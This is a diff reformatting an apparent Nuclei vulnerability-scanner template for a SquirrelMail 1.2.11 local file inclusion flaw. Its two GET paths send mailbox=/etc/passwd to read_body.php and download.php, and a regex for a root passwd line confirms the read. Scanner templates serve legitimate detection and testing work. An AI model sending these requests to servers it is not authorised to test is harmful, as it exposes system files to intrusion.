@@ -1,5 +1,4 @@
 id: squirrelmail-lfi
-
 info:
   name: SquirrelMail 1.2.11 - Local File Inclusion
   author: dhiyaneshDk
@@ -10,27 +9,22 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-73
   metadata:
     runzero-match: service["favicon.ico.image.mmh3"] == "1511806001" || any([service["http.body"], service["last.http.body"]], {# matches "(?i)squirrelmail"})
     max-request: 2
-  tags: lfi,squirrelmail,edb,vuln
-
+  tags: edb,lfi,squirrelmail,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/src/read_body.php?mailbox=/etc/passwd&passed_id=1&"
-      - "{{BaseURL}}/src/download.php?absolute_dl=true&passed_id=1&passed_ent_id=1&mailbox=/etc/passwd"
-
-    stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:[x*]:0:0"
-
-      - type: status
-        status:
+  - matchers:
+      - regex:
+          - root:[x*]:0:0
+        type: regex
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/src/read_body.php?mailbox=/etc/passwd&passed_id=1&'
+      - '{{BaseURL}}/src/download.php?absolute_dl=true&passed_id=1&passed_ent_id=1&mailbox=/etc/passwd'
+    stop-at-first-match: true
